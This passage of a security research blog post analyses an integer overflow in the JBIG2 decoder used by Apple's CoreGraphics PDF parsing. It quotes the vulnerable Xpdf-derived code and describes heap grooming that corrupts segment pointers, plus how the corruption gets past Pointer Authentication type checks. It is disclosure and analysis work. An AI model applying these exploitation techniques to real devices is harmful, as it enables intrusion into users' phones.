src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3gos8L_dEuVS2ltgPw-T3WxC6COMIyYoq4DlSN8Z8XgNueXzXBBlQF_BusBrKSJowwIu0OouJLMwZwPZyMiORoXCShUtbb65C3ZkKU9Tzo8ANc5862ImuSa9v1pjcjxR2v4T-UdpMYlV7DEsVgr43Mj3yAjHn_EXcxVxXFhxHqq1QXoEdP3S1JnRm/s700/image10.png\" border=\"0\" alt=\"\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c12\"&gt;&lt;span class=\"c9 c7\"&gt;A Xerox WorkCentre 7500 series multifunction printer, which used JBIG2&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c12\"&gt;&lt;span class=\"c7\"&gt;for its scan-to-pdf functionality&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c12\"&gt;&lt;span class=\"c7\"&gt;source: &lt;/span&gt;&lt;span class=\"c16 c7\"&gt;&lt;a class=\"c21\" href=\"https://www.office.xerox.com/en-us/multifunction-printers/workcentre-7545-7556/specifications\"&gt;https://www.office.xerox.com/en-us/multifunction-printers/workcentre-7545-7556/specifications&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;The PDFs files produced by those scanners were exceptionally small, perhaps only a few kilobytes. There are two novel techniques which JBIG2 uses to achieve these extreme compression ratios which are relevant to this exploit:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c8\"&gt;Technique&lt;/span&gt;&lt;span class=\"c8\"&gt;&amp;nbsp;1: &lt;/span&gt;&lt;span class=\"c14 c8\"&gt;Segmentation and substitution&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Effectively every text document, especially those written in languages with small alphabets like English or German, consists of many repeated letters (also known as &lt;/span&gt;&lt;span class=\"c7\"&gt;glyphs&lt;/span&gt;&lt;span class=\"c5\"&gt;) on each page. JBIG2 tries to segment each page into glyphs then uses simple pattern matching to match up glyphs which look the same:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c4\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c4\"&gt;&lt;span class=\"c5\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi2YXgDQeGK1E3GixB5S11rI1e7Xqi3cQJKuL4ZklPLYw8U1hbbEDXGOyCfcqqhoQT2evw5kHYC3Ba9RWx21XHknWvjxFKg5te5-K19ZYaoTR2wD4AmBw_c-9RXNUuonuD2TT21aTlvihuC_i_t3GgYFjw2pzL7YshGF7BZa4bq-i44V63NN6Pv7yzy/s352/image4%284%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi2YXgDQeGK1E3GixB5S11rI1e7Xqi3cQJKuL4ZklPLYw8U1hbbEDXGOyCfcqqhoQT2evw5kHYC3Ba9RWx21XHknWvjxFKg5te5-K19ZYaoTR2wD4AmBw_c-9RXNUuonuD2TT21aTlvihuC_i_t3GgYFjw2pzL7YshGF7BZa4bq-i44V63NN6Pv7yzy/s352/image4%284%29.png\" border=\"0\" alt=\"\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c12\"&gt;&lt;span class=\"c9 c7\"&gt;Simple pattern matching can find all the shapes which look similar on a page,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c12\"&gt;&lt;span class=\"c9 c7\"&gt;in this case all the &amp;#39;e&amp;#39;s&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c9 c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;JBIG2 doesn&amp;#39;t actually know anything about glyphs and it isn&amp;#39;t doing OCR (optical character recognition.) A JBIG encoder is just looking for connected regions of pixels and grouping similar looking regions together. The compression algorithm is to simply substitute all &lt;/span&gt;&lt;span class=\"c7\"&gt;sufficiently-similar&lt;/span&gt;&lt;span class=\"c5\"&gt;&amp;nbsp;looking regions with a copy of just one of them:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c4\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c4\"&gt;&lt;span class=\"c5\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2k3SPN7fikk3DnL-5YdWTK6_n1JTjvlb6qC-4tVnHeqU16cM6VWYjmMzNL9ZwMK0MXOhWITS_P0kgsx3YFHDaI2Rd5R8f1CM55ccmCBROIlyymNW2jSSCRWCpddWLuIzhGG6uB8PDKcDg5IpWW7NjdvVPZRFme3Hk4EHHmXZwEJYoohHgaVa31w0u/s327/image1%285%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2k3SPN7fikk3DnL-5YdWTK6_n1JTjvlb6qC-4tVnHeqU16cM6VWYjmMzNL9ZwMK0MXOhWITS_P0kgsx3YFHDaI2Rd5R8f1CM55ccmCBROIlyymNW2jSSCRWCpddWLuIzhGG6uB8PDKcDg5IpWW7NjdvVPZRFme3Hk4EHHmXZwEJYoohHgaVa31w0u/s327/image1%285%29.png\" border=\"0\" alt=\"\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c12\"&gt;&lt;span class=\"c9 c7\"&gt;Replacing all occurrences of similar glyphs with a copy of just one often yields a document which is still quite legible and enables very high compression ratios&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;In this case the output is perfectly readable but the amount of information to be stored is significantly reduced. Rather than needing to store all the original pixel information for the whole page you only need a compressed version of the &amp;quot;reference glyph&amp;quot; for each character and the relative coordinates of all the places where copies should be made. The decompression algorithm then treats the output page like a canvas and &amp;quot;draws&amp;quot; the exact same glyph at all the stored locations.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;There&amp;#39;s a significant issue with such a scheme: it&amp;#39;s far too easy for a poor encoder to accidentally swap similar looking characters, and this can happen with interesting consequences. &lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"http://www.dkriesel.com/en/blog/2013/0802_xerox-workcentres_are_switching_written_numbers_when_scanning\"&gt;D. Kriesel&amp;#39;s blog has some motivating examples&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;where PDFs of scanned invoices have different figures or PDFs of scanned construction drawings end up with incorrect measurements. These aren&amp;#39;t the issues we&amp;#39;re looking at, but they are one significant reason why JBIG2 is not a common compression format anymore.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c8\"&gt;Technique &lt;/span&gt;&lt;span class=\"c8\"&gt;2: &lt;/span&gt;&lt;span class=\"c8\"&gt;Refinement coding&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;As mentioned above, the substitution based compression output is lossy. After a round of compression and decompression the rendered output doesn&amp;#39;t look exactly like the input. But JBIG2 also supports lossless compression as well as an intermediate &amp;quot;less lossy&amp;quot; compression mode.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;It does this by also storing (and compressing) the &lt;/span&gt;&lt;span class=\"c7\"&gt;difference&lt;/span&gt;&lt;span class=\"c5\"&gt;&amp;nbsp;between the substituted glyph and each original glyph. Here&amp;#39;s an example showing a difference mask between a substituted character on the left and the original lossless character in the middle:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c4\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c4\"&gt;&lt;span class=\"c5\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-7RiEuIp4vanQlf6nxJf1tfbuA7B61DISNjLlNxXrvSqFnqxcvSLPN6_60h2ypZdjDKHtNmCN3Nr5W66JaLw_j5iSxxntOZ0eXFB2wEQHfUjs_9LIwmckCXdTzurtKgpwyaWkGfInvM35YC3kp_K4qyJYxV4HDEf0E9W_Zqt3OelULvnfSlWAc2Kw/s267/image3%285%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-7RiEuIp4vanQlf6nxJf1tfbuA7B61DISNjLlNxXrvSqFnqxcvSLPN6_60h2ypZdjDKHtNmCN3Nr5W66JaLw_j5iSxxntOZ0eXFB2wEQHfUjs_9LIwmckCXdTzurtKgpwyaWkGfInvM35YC3kp_K4qyJYxV4HDEf0E9W_Zqt3OelULvnfSlWAc2Kw/s267/image3%285%29.png\" border=\"0\" alt=\"\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c12\"&gt;&lt;span class=\"c9 c7\"&gt;Using the XOR operator on bitmaps to compute a difference image&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;In this simple example the encoder can store the difference mask shown on the right, then during decompression the difference mask can be XORed with the substituted character to recover the exact pixels making up the original character. There are some more tricks outside of the scope of this blog post to further compress that difference mask using the intermediate forms of the substituted character as a &amp;quot;context&amp;quot; for the compression.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Rather than completely encoding the entire difference in one go, it can be done in steps, with each iteration using a logical operator (one of AND, OR, XOR or XNOR) to set, clear or flip bits. Each successive refinement step brings the rendered output closer to the original and this allows a level of control over the &amp;quot;&lt;/span&gt;&lt;span&gt;lossiness&lt;/span&gt;&lt;span class=\"c5\"&gt;&amp;quot; of the compression. The implementation of these refinement coding steps is very flexible and they are also able to &amp;quot;read&amp;quot; values already present on the output canvas.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c14 c8\"&gt;A JBIG2 stream&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Most of the CoreGraphics PDF decoder appears to be Apple proprietary code, but the JBIG2 implementation is from Xpdf, &lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://www.xpdfreader.com/download.html\"&gt;the source code for which is freely available&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c5\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;The JBIG2 format is a series of segments, which can be thought of as a series of drawing commands which are executed sequentially in a single pass. The CoreGraphics JBIG2 parser supports 19 different segment types which include operations like defining a new page, decoding a huffman table or rendering a bitmap to given coordinates on the page.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Segments are represented by the class &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Segment&lt;/span&gt;&lt;span&gt;&amp;nbsp;and its subclasses &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2SymbolDict&lt;/span&gt;&lt;span class=\"c5\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;A &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;represents a rectangular array of pixels. Its &lt;/span&gt;&lt;span class=\"c6\"&gt;data&lt;/span&gt;&lt;span class=\"c5\"&gt;&amp;nbsp;field points to a backing-buffer containing the rendering canvas.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;A &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2SymbolDict&lt;/span&gt;&lt;span&gt;&amp;nbsp;groups &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Bitmaps&lt;/span&gt;&lt;span&gt;&amp;nbsp;together. The destination page is represented as a &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span class=\"c5\"&gt;, as are individual glyphs.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c6\"&gt;JBIG2Segments&lt;/span&gt;&lt;span&gt;&amp;nbsp;can be referred to by a segment number and the &lt;/span&gt;&lt;span class=\"c6\"&gt;GList&lt;/span&gt;&lt;span&gt;&amp;nbsp;vector type stores pointers to all the &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Segments&lt;/span&gt;&lt;span&gt;. To look up a segment by segment number the &lt;/span&gt;&lt;span class=\"c6\"&gt;GList&lt;/span&gt;&lt;span&gt;&amp;nbsp;is scanned sequentially.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c14 c8\"&gt;The vulnerability&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;The vulnerability is a classic integer overflow when collating referenced segments:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.7ed94ce0bf920398965583c15daf9916cc6dcfb3\"&gt;&lt;/a&gt;&lt;a id=\"t.0\"&gt;&lt;/a&gt;&lt;table class=\"c22\"&gt;&lt;tbody&gt;&lt;tr class=\"c11\"&gt;&lt;td class=\"c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c0 c18\"&gt;Guint numSyms; // (1)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; numSyms = 0;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; for (i = 0; i &amp;lt; nRefSegs; ++i) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; if ((seg = findSegment(refSegs[i]))) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; if (seg-&amp;gt;getType() == jbig2SegSymbolDict) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c0 c18\"&gt;numSyms += ((JBIG2SymbolDict *)seg)-&amp;gt;getSize(); &amp;nbsp;// (2)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; } else if (seg-&amp;gt;getType() == jbig2SegCodeTable) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; codeTables-&amp;gt;append(seg);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; } else {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; error(errSyntaxError, getPos(),&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;quot;Invalid segment reference in JBIG2 text region&amp;quot;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; delete codeTables;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; return;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;...&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; // get the symbol bitmaps&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c6 c18\"&gt;syms = (&lt;/span&gt;&lt;span class=\"c6 c18\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span class=\"c6 c18\"&gt;&amp;nbsp;**)gmallocn(numSyms, sizeof(&lt;/span&gt;&lt;span class=\"c6 c18\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span class=\"c0 c18\"&gt;&amp;nbsp;*)); // (3)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; kk = 0;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; for (i = 0; i &amp;lt; nRefSegs; ++i) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; if ((seg = findSegment(refSegs[i]))) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; if (seg-&amp;gt;getType() == jbig2SegSymbolDict) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; symbolDict = (JBIG2SymbolDict *)seg;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; for (k = 0; k &amp;lt; symbolDict-&amp;gt;getSize(); ++k) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c0 c18\"&gt;syms[kk++] = symbolDict-&amp;gt;getBitmap(k); // (4)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c21\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; }&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c6\"&gt;numSyms&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a 32-bit integer declared at &lt;/span&gt;&lt;span class=\"c6\"&gt;(1)&lt;/span&gt;&lt;span&gt;. By supplying carefully crafted &lt;/span&gt;&lt;span&gt;reference segments&lt;/span&gt;&lt;span&gt;&amp;nbsp;it&amp;#39;s possible for the repeated addition at &lt;/span&gt;&lt;span class=\"c6\"&gt;(2)&lt;/span&gt;&lt;span&gt;&amp;nbsp;to cause &lt;/span&gt;&lt;span class=\"c6\"&gt;numSyms&lt;/span&gt;&lt;span class=\"c5\"&gt;&amp;nbsp;to overflow to a controlled, small value.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;That smaller value is used for the heap allocation size at &lt;/span&gt;&lt;span class=\"c6\"&gt;(3)&lt;/span&gt;&lt;span&gt;&amp;nbsp;meaning &lt;/span&gt;&lt;span class=\"c6\"&gt;syms&lt;/span&gt;&lt;span class=\"c5\"&gt;&amp;nbsp;points to an undersized buffer.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Inside the inner-most loop at &lt;/span&gt;&lt;span class=\"c6\"&gt;(4)&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer values are written into the undersized &lt;/span&gt;&lt;span class=\"c6\"&gt;syms&lt;/span&gt;&lt;span class=\"c5\"&gt;&amp;nbsp;buffer.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Without another trick this loop would write over 32GB of data into the undersized &lt;/span&gt;&lt;span class=\"c6\"&gt;syms&lt;/span&gt;&lt;span&gt;&amp;nbsp;buffer, certainly causing a crash. To avoid that crash the heap is groomed such that the first few writes off of the end of the &lt;/span&gt;&lt;span class=\"c6\"&gt;syms&lt;/span&gt;&lt;span&gt;&amp;nbsp;buffer corrupt the &lt;/span&gt;&lt;span class=\"c6\"&gt;GList&lt;/span&gt;&lt;span&gt;&amp;nbsp;backing buffer. This &lt;/span&gt;&lt;span class=\"c6\"&gt;GList&lt;/span&gt;&lt;span&gt;&amp;nbsp;stores all known segments and is used by the &lt;/span&gt;&lt;span class=\"c6\"&gt;findSegments&lt;/span&gt;&lt;span&gt;&amp;nbsp;routine to map from the segment numbers passed in &lt;/span&gt;&lt;span class=\"c6\"&gt;refSegs&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Segment&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointers. The overflow causes the JBIG2Segment pointers in the GList to be overwritten with &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointers at &lt;/span&gt;&lt;span class=\"c6\"&gt;(4)&lt;/span&gt;&lt;span class=\"c5\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Conveniently since &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;inherits from &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Segment&lt;/span&gt;&lt;span&gt;&amp;nbsp;the &lt;/span&gt;&lt;span class=\"c6\"&gt;seg-&amp;gt;getType()&lt;/span&gt;&lt;span&gt;&amp;nbsp;virtual call succeed even on devices where Pointer Authentication is enabled (which is used to perform a weak type check on virtual calls) but the returned type will now &lt;/span&gt;&lt;span class=\"c8\"&gt;not&lt;/span&gt;&lt;span&gt;&amp;nbsp;be equal to &lt;/span&gt;&lt;span class=\"c6\"&gt;jbig2SegSymbolDict&lt;/span&gt;&lt;span&gt;&amp;nbsp;thus causing further writes at &lt;/span&gt;&lt;span class=\"c6\"&gt;(4)&lt;/span&gt;&lt;span&gt;&amp;nbsp;to not be reached and bounding the extent of the memory corruption&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c4\"&gt;&lt;/p&gt;\n  \n  \n &lt;p class=\"c4\"&gt;&lt;span class=\"c5\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9fFsg7COjTu5Aq2rV9CTyka-eczC_BvD3wrGUP3XL5W9RHoGOKElzDMbDWLrgp1BJfRvEjcw36ZdMgbA2iwnjj0jqDKGBS94UL2tdcH0evSr66V5uGUrhra3PlGyKvCznPT2rSUL3ZegDR-FXRbKw6SJFzNrgubTbAzKXKVrga6h-B3VcHFqOU9zx/s506/image6%282%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9fFsg7COjTu5Aq2rV9CTyka-eczC_BvD3wrGUP3XL5W9RHoGOKElzDMbDWLrgp1BJfRvEjcw36ZdMgbA2iwnjj0jqDKGBS94UL2tdcH0evSr66V5uGUrhra3PlGyKvCznPT2rSUL3ZegDR-FXRbKw6SJFzNrgubTbAzKXKVrga6h-B3VcHFqOU9zx/s506/image6%282%29.png\" border=\"0\" alt=\"\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c12\"&gt;&lt;span class=\"c9 c7\"&gt;A simplified view of the memory layout when the heap overflow occurs showing the undersized-buffer below the GList backing buffer and the JBIG2Bitmap&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c9 c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c8 c14\"&gt;Boundless unbounding&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Directly after the corrupted segments &lt;/span&gt;&lt;span class=\"c6\"&gt;GList&lt;/span&gt;&lt;span&gt;, the attacker grooms the &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span class=\"c5\"&gt;&amp;nbsp;object which represents the current page (the place to where current drawing commands render). 